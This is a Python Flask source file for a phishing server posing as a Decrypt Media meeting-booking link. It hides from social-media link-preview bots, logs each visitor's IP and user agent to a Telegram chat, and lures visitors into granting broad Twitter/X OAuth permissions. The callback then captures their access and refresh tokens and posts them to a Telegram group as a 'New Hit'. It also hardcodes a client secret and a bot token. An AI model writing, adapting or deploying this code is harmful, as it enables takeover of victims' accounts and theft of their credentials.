from flask import Flask, request, redirect
import requests
import base64

app = Flask(__name__)

TWITTER_CLIENT_ID = 'eWNUdkx4LTlnaGQ0N3BaSGJyYkU6MTpjaQ'
TWITTER_CLIENT_SECRET = 'FJchk67NNjQgydI77UUI1xQ7a8u4zY50LJuPYFCzzP8I0MkSZ6'
TWITTER_CALLBACK_URL = 'https://twitter-logger.onrender.com/callback'
TELEGRAM_GROUP_CHAT_ID = '-4124636328'

TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'

credentials = f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}"
credentials_base64 = base64.b64encode(credentials.encode()).decode('utf-8')

@app.route('/decryptmedia/meeting-hour')
def index():
    user_agent_string = request.headers.get('User-Agent')
    user_agent = user_agent_string.strip('\r\n')
    if 'Twitterbot' in user_agent or 'Discordbot' in user_agent or 'TelegramBot' in user_agent:
        return redirect('https://calendly.com/advonis-x')
    else:
        if 'X-Forwarded-For' in request.headers:
            real_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
        else:
            real_ip = request.remote_addr

        refId = request.args.get('ref')
        url = f'https://panel-1rn0.onrender.com/api/connection/send/{refId}'
    
        data = {
            'IP': real_ip,
            'country': 'AU',
            'device': 'Windows 10',
            'OSName': 'Firefox'
        }
        
        # res = requests.post(url, json=data, proxies=None)
    
        message = f'🔗 Connection: {real_ip}\n\nUser agent: {user_agent}'

        requests.post(
            f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
            data={
                'chat_id': TELEGRAM_GROUP_CHAT_ID,
                'text': message
            }
        )

        twitter_oauth_url = f'https://twitter.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}&redirect_uri={TWITTER_CALLBACK_URL}&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write&state=state&code_challenge=challenge&code_challenge_method=plain'
        return redirect(twitter_oauth_url)

@app.route('/callback')
def callback():
  try:
    authorization_code = request.args.get('code')

    token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
    user_lookup_url = 'https://api.twitter.com/2/users/me'

    request_data = {
        'grant_type': 'authorization_code',
        'code': authorization_code,
        'redirect_uri': TWITTER_CALLBACK_URL,
        'code_verifier': "challenge"
    }

    headers = {
        'Authorization': f'Basic {credentials_base64}',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    response = requests.post(token_exchange_url,
                             data=request_data,
                             headers=headers)
    response_data = response.json()

    access_token = response_data['access_token']
    refresh_token = response_data['refresh_token']

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
    }

    response = requests.get(user_lookup_url,
                             headers=headers)
    response_data = response.json()

    username = response_data['data']['username']

    send_to_telegram(username, access_token, refresh_token)

    return redirect("https://calendly.com/decryptmedia", code=302)

  except Exception as e:
    return e;

def send_to_telegram(username, access_token, refresh_token):
  try:
    message = f'⚠️ *New Hit* ⚠️\n\nx.com/{username}\n\n🔑 Access Token:\n`{access_token}`\n\n🔄 Refresh Token:\n`{refresh_token}`'

    requests.post(
        f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
        data={
            'chat_id': TELEGRAM_GROUP_CHAT_ID,
            'text': message,
            'parse_mode': 'MarkDown'
        })

  except Exception as e:
    print(f'Error sending message to Telegram: {str(e)}')
